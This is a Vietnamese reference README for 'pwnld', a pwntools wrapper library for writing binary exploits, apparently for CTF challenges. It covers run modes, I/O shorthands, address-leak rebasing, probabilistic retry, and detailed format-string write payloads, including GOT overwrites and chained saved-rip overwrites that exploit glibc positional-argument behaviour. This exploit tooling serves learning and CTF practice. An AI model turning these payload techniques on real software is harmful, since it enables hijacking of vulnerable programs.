# pwnld — tham chiếu đầy đủ

Lớp helper mỏng bọc pwntools cho exploit. Trong script:

```python
from pwnld import *
```

> Bản tóm tắt ngắn xem bằng `python3 pwnld.py --help` (tra cứu theo chủ đề:
> `--help start|modes|io|leaks|fmt|retry`, hoặc `--help all` cho toàn bộ).
> File này là bản đầy đủ để đọc/tra trên GitHub.

## Mục lục

- [Bắt đầu nhanh](#bắt-đầu-nhanh)
- [1. Khung exploit & cấu hình (`start`)](#1-khung-exploit--cấu-hình-start)
- [2. Modes (`modes`)](#2-modes-modes)
- [3. Gửi / nhận (`io`)](#3-gửi--nhận-io)
- [4. Leak + rebase (`leaks`)](#4-leak--rebase-leaks)
- [5. Ghi bằng format string (`fmt`)](#5-ghi-bằng-format-string-fmt)
- [6. Retry khi exploit xác suất (`retry`)](#6-retry-khi-exploit-xác-suất-retry)

---

## Bắt đầu nhanh

```python
context.binary = exe = ELF("./chall")
p = start()          # chọn mode khi chạy exploit
GDB()                # attach nếu mode bật cờ GDB
# ... gửi payload ...
ia()                 # tương tác với tiến trình
```

---

## 1. Khung exploit & cấu hình (`start`)

Thứ tự chuẩn của một script:

```python
context.binary = exe = ELF("./chall")
#   nạp binary; từ đây có exe.sym / exe.got / exe.plt / exe.address.
libc = get_libc()
#   tự tìm file libc trong thư mục hiện tại (local) -> libc.sym.system, binsh...
p = start()
#   MỞ tiến trình/kết nối theo MODE ở dòng lệnh (xem mục 2). Trả về tube, gán vào p.
GDB()
#   chỉ attach GDB khi MODE bật cờ attach; đặt NGAY sau start(), trước khi gửi payload.
ia()
#   interactive() — giao shell gõ tay. Thường đặt cuối.
```

Khai báo đích & GDB — **gọi TRƯỚC `start()`**:

```python
set_remote("host", 1337)
#   host:port cho MODE 2 (remote TCP).
set_ssh("host", "user", "pass", "/path/chall", port=22, keyfile=None)
#   thông tin SSH cho MODE 10/11.
set_gdbscript("b*main\nc")
#   lệnh gdb chạy khi GDB() attach (breakpoint, lệnh init...).
```

---

## 2. Modes (`modes`)

Chạy: `./exploit.py <MODE>` (không truyền = `00`).

Hai chữ số = `(ĐÍCH)(GDB)`. Chữ 1: `0` local, `1` ssh. Chữ 2: `0` không attach, `1` attach.

| MODE | Đích | GDB | Ghi chú |
|------|------|-----|---------|
| `00` | local | không | mặc định, chạy nhanh |
| `01` | local | có | debug local |
| `10` | ssh | không | |
| `11` | ssh | có | |
| `2`  | remote TCP (netcat) | — | không attach được, chỉ gửi/nhận |

Ví dụ: `./exploit.py 01` (debug local) · `./exploit.py 2` (đánh remote).

---

## 3. Gửi / nhận (`io`)

Tham số `x` nhận `str`, `bytes` hay `int` đều được — tự chuẩn hoá.

**Gửi** (`l` = thêm `\n` cuối):

| Hàm | Tương đương pwntools |
|-----|----------------------|
| `s(x)`   | `send` |
| `sl(x)`  | `sendline` |
| `sa(delim, x)`  | `sendafter` |
| `sla(delim, x)` | `sendlineafter` (hay dùng nhất) |

```python
sla("prompt> ", payload)   # chờ thấy "prompt> " rồi gửi payload kèm xuống dòng
```

**Nhận:**

| Hàm | Ý nghĩa |
|-----|---------|
| `ru(x[, drop])` | recvuntil: đọc tới khi gặp `x`; `drop=True` bỏ luôn `x` khỏi kết quả |
| `rc(n)` | đọc đúng `n` byte |
| `rl()` | đọc 1 dòng |
| `ra([t])` | đọc tới EOF |

**Tiện:** `uu64(b)` / `uu32(b)` = unpack tự chèn `\0` cho đủ 8/4 byte (khỏi lo thiếu byte).
`li/ls/lw/le` = log info/success/warn/error. `flat`, `p64`, `cyclic`... (từ pwntools).

---

## 4. Leak + rebase (`leaks`)

Tên hàm: `leak_<vùng>_<kiểu>(offset, until, ...)`.

- `<vùng>` = `libc` | `bin` | `stack` | `heap` → quyết định rebase **cái gì**.
- `<kiểu>` = chọn theo cách binary **in** địa chỉ ra (chỗ hay nhầm):

| Kiểu | Khi binary in bằng | Dạng ra | Xử lý |
|------|--------------------|---------|-------|
| `_p` | `%p` / `%lx` / `%x` | CHỮ hex `"0x55.."` | `int(x, 16)` |
| `_s` | `%s` | BYTE thô 6 byte | `uu64(bytes)` |

```python
leak_bin_p(0x1267, "You said: ")
#   output "You said: 0x55..\n": đọc sau "You said: ", lấy số hex TỚI end -> trừ offset.

leak_bin_p(0x1267, "addr=", end=")")
#   cho output "addr=0x55..)" — lấy tới ')'.   (end sai/không có trong stream -> TREO!)

leak_libc_s(0x1ec980, "data: ", n=6)
#   binary in %s (byte thô): đọc sau "data: " đúng n=6 byte (n=0 = cả dòng, bỏ '\n').
```

- `end` = ký tự THẬT ngay SAU số (mặc định `"\n"`). Chỉ đổi khi số không kết bằng xuống dòng.
- `rebase_bin(leak, offset)` / `rebase_libc` / `rebase_stack` / `rebase_heap` — khi bạn
  ĐÃ có số leak (parse tay), chỉ cần rebase, không đọc nữa.
- stack/heap không phải ELF → base lưu ở `CFG.STACK_BASE` / `CFG.HEAP_BASE`.

---

## 5. Ghi bằng format string (`fmt`)

Hai hàm cho **hai tình huống khác nhau**.

### `fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')` — của pwntools

**Dùng khi:** bạn **biết địa chỉ đích** (GOT, ret, biến). Nó nhúng địa chỉ vào payload rồi `%n`.

| Tham số | Ý nghĩa |
|---------|---------|
| `offset` | ô stack nơi **chuỗi payload** của bạn bắt đầu (dò `%p.%p...` hoặc `FmtStr`) |
| `writes` | dict `{địa_chỉ: giá_trị}`, ghi nhiều đích cùng lúc: `{got_a: x, got_b: y}` |
| `numbwritten` | số ký tự printf đã in **trước** payload (vd prompt bị `%n` đếm chung) → trừ pad |
| `write_size` | `'byte'`\|`'short'`\|`'int'` = ghi theo `%hhn`\|`%hn`\|`%n` (1\|2\|4 byte mỗi `%n`) |

`'byte'` (mặc định) an toàn nhất: pad nhỏ, ít kẹt byte xấu, nhưng payload dài hơn.
Trả về bytes; tự tách thành nhiều `%n` và sắp thứ tự tăng dần.
Nâng cao (ít dùng): `badbytes=frozenset(b'...')` né byte xấu · `no_dollars=True` khi binary
cấm ký tự `$` · `offset_bytes` lệch byte trong ô · `strategy`/`overflows`.

### `fmtstr_pos(pos, value, size=2, written=0, star=None, form="short", consumed=0)` — của pwnld

**Dùng khi:** ô stack thứ `pos` **đã chứa sẵn** con trỏ đích → ghi **xuyên** qua nó (`%pos$hn`).
`fmtstr_payload` không làm được: nó chỉ ghi vào địa chỉ do chính nó **nhúng** vào buffer;
ở đây con trỏ đích là của chương trình, nằm sẵn trên stack — ta mượn lại.

| Tham số | Ý nghĩa |
|---------|---------|
| `pos` | vị trí positional của **ô stack đang giữ con trỏ đích**. Dò bằng `%p`: nếu `"%6$p"` rò ra con trỏ cần thì `pos=6`. (value ghi vào `*stack[pos]`.) |
| `value` | giá trị cần ghi; tự lấy `size` byte thấp (ghi 2 byte → `value & 0xffff`) |
| `size` | `1`\|`2`\|`4`\|`8` → `%hhn`\|`%hn`\|`%n`\|`%lln`. Nhỏ: pad ít, ít kẹt, payload dài; lớn: 1 phát nhưng pad to |
| `written` | số ký tự printf **đã in trước** đoạn này (prompt, hoặc `%n` phát trước) → trừ pad. Nối nhiều phát: `written` phát sau = **tổng** ký tự các phát trước đã in |
| `form` | `'short'` (mặc định) `%<pad>c%pos$hn` — ngắn, cho 1 phát ghi lẻ. `'full'` `%c..%c%<pad>c%hn` (không `$`) — xem mục [Short vs Full](#short-vs-full--ghi-móc-xích) |
| `consumed` | (chỉ `form='full'`) số arg printf **đã tiêu thụ** trước đoạn này, để đếm `%c` cho trúng `pos`. Sau 1 phát full tới `pos`: `consumed := pos` |
| `star` | (chỉ `form='short'`) `N` → `%*N$c%pos$hn`: lấy **độ rộng** từ ô `stack[N]` thay vì in pad; nhớ nhét `value` thật vào ô `stack[N]`. Dùng khi value quá lớn |

Trả về **bytes** sẵn; nhiều đích thì nối bằng `flat()`/`+`; khỏi `.encode()`.

### Ví dụ thực tế (theo tham số)

```python
# pos: ghi 1 phát khi con trỏ đích ĐÃ nằm ở ô stack 38 (size=2 mặc định):
payload = fmtstr_pos(38, exe.address + 0x2f0)                 # b"%<pad>c%38$hn"

# size + written: value lớn -> ghi TỪNG BYTE nhiều ô liên tiếp, cộng dồn written:
payload  = fmtstr_pos(38, 0xef, size=1)                       # byte thấp, in 0xef ký tự
payload += fmtstr_pos(39, 0x9f, size=1, written=0xef)         # byte kế, trừ 0xef đã in

# star: value khổng lồ -> lấy ĐỘ RỘNG từ ô stack[14] (nhớ nhét value thật vào ô 14):
payload = fmtstr_pos(38, 0, star=14)                          # b"%*14$c%38$hn"

# form/consumed: ghi móc xích 2 tầng (stack-pointer-overwrite):
#   phát 1 FULL (chạy trước) dựng con trỏ ô 10 -> saved-rip; phát 2 SHORT ghi xuyên ô 14:
payload = flat(fmtstr_pos(10, 0xa8, size=1, form="full"),            # written=0, consumed=0
               fmtstr_pos(14, exe.sym.get_shell + 5, written=0xa8))  # in sau 0xa8 ký tự

# consumed: chuỗi 3 tầng — HAI phát FULL liên tiếp; phát full sau đếm %c TIẾP từ consumed:
payload = flat(
    fmtstr_pos(10, 0xb0, size=1, form="full"),                      # consumed=0 -> tới arg10
    fmtstr_pos(12, 0xc8, size=1, form="full", consumed=10, written=0xb0),  # đếm tiếp arg11->12
    fmtstr_pos(14, exe.sym.win, written=0xc8),                      # short: ghi xuyên ô 14
)
#   phát 1: b"%c"*8 + "%168c%hhn"  (ăn arg1..10, in 0xb0 ký tự)
#   phát 2: b"%24c%hhn"            (consumed=10 -> chỉ 1 %c, %hhn rơi arg12)
#   quên consumed=10 -> phát 2 thành "%c"*10+"%14c%hhn", đếm lại từ arg1 -> lệch hết.

# fmtstr_payload (khi BIẾT địa chỉ đích): off = ô bắt đầu payload (dò %p):
payload = fmtstr_payload(6, {exe.got.puts: exe.sym.win})

# numbwritten: prompt in sẵn vài ký tự trước payload -> trừ vào pad:
payload = fmtstr_payload(6, {exe.got.exit: exe.sym.win}, numbwritten=len("Name: "))
```

### Short vs Full — ghi móc xích

Trong **ghi móc xích** (một `%n` trước dựng con trỏ cho một `%n` sau dùng — vd kỹ thuật
*FSB stack-pointer-overwrite*: phát 1 sửa byte thấp một con trỏ trên stack cho nó trỏ vào
saved-rip, phát 2 ghi `get_shell` xuyên con trỏ đó), **phát ghi đầu bắt buộc `form='full'`**.

Lý do: trong glibc, **hễ gặp bất kỳ `%k$` nào là printf chuyển sang chế độ positional và
đọc-trước (chụp ảnh) TẤT CẢ con trỏ vào một bảng TRƯỚC khi in**. Nếu phát đầu cũng dùng `$`
(`form='short'`), con trỏ của phát sau bị chụp ở **giá trị cũ** — trước khi phát đầu kịp sửa —
nên phát sau ghi nhầm địa chỉ → **hỏng chuỗi**.

- `form='full'` (`%c...%hn`, không `$`): phát đầu chạy ở pha **tuần tự**, ghi **sống** ngay,
  vá con trỏ trên stack. Tới `%k$` của phát sau glibc mới chụp → đọc được con trỏ **đã vá**.
- Quy tắc: phát ghi nào **bị một `%n$` positional sau quan sát** thì phải `full`; phát ghi
  **cuối** (không ai quan sát) để `short` là được.

Kiểm chứng (glibc 2.39): dựng con trỏ `&tA`→`&tB` rồi ghi xuyên qua nó.

| Dạng | Phát 1 | Phát 2 | Ghi vào | Kết quả |
|------|--------|--------|---------|---------|
| short + short | `%N$hhn` (có `$`) | `%M$hhn` | con trỏ **cũ** (`tA`) | **hỏng** |
| full + short  | `%hhn` (tuần tự) | `%M$hhn` | con trỏ **đã vá** (`tB`) | **đúng** |

---

## 6. Retry khi exploit xác suất (`retry`)

```python
from pwnretry import retry, got_shell, got_flag

retry(attempt, tries=200)
#   chạy lại attempt(i) tới khi nó trả True (vd leak 50% đúng, ASLR brute...).
```

**Bẫy:** binary có `sleep`/delay trước shell → `got_shell(timeout=>delay)`; mặc định `0.3s`
sẽ bỏ cuộc trước khi shell hiện → báo trượt oan dù payload đúng.
